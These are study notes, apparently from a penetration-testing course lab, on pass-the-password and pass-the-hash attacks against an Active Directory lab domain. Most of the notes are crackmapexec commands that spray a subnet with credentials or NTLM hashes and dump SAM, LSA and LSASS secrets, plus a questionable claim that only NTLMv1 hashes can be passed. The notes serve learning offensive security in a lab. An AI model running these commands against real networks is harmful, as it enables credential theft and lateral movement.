## Pass Attacks Overview

Pass the password/hash
When we crack the passwprd or can dump the SAM hashes

crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
Map every device that have the ability to accept a connection from the valid account (once we got that valid account) here over SMB. It checks if we have access and local admin on that machine ('Pwn3d' message).

If we do not have the password we can do the same thing with hashes. Once we got hashes for example using psexec on msfconsole and 'hashdump' once the meterpreter executed, or after executing secretsdump after mitm6 account creation.
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth 

Can also use crackmapexec to dump the SAM
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --sam

Or enumerate shares and what shares are available on this device
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --shares

Or dump local security authority
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --lsa

We can also used several built-in modules
crakmapexec smb -L

For example to dump the lassy
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth -M lsassy
lsassy does store credentials used in real time

Difference d'utiliser --local-auth et -d ?

## Pass Attacks

crackmapexec --help
crackmapexec smb --help

Lab command:
crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1

Knowing where we can access, we will later on start dumping secrets using secretsdump.py

Lab command using hash (useful if hash cannot be cracked. NTLMv1 hash only. v2 can be relayed):
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth

Dump SAM base once a connection is validated:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --sam
SAM base is added to working database

Enumerate the shares:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --shares

LSA for secret dump :
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --lsa
Keep secrets but some passwords and so hashes might have been changed and are not valid anymore

Modules:
List modules
crackmapexec smb -L

Use module lsassy
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth -M lsassy
If any secret is stored in memory we may be able to see that

Crackmapexec database:
cmedb
help
host //all host pulled in the network
creds // all the creds we found and on what they work